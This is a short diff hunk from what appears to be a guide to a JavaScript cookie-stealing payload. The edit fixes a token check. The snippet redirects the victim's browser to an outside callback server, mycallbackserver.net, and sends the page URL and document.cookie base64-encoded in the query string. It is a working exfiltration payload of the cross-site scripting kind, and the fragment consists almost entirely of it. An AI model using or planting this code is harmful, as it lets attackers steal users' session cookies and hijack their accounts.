@@ -16,7 +16,7 @@ You can shorten this code by removing the token if you are not using it in store
 
 ```javascript
 const token = "w3lRZ87e";
-if (location.hash != token) globalThis.location = "https://mycallbackserver.net/callback.php" + 
+if (location.hash != `#${token}`) globalThis.location = "https://mycallbackserver.net/callback.php" + 
   "?referer=" + encodeURIComponent(btoa(globalThis.location.href)) + 
   "&data=" + encodeURIComponent(btoa(document.cookie)) + 
   "&token=" + encodeURIComponent(btoa(token));
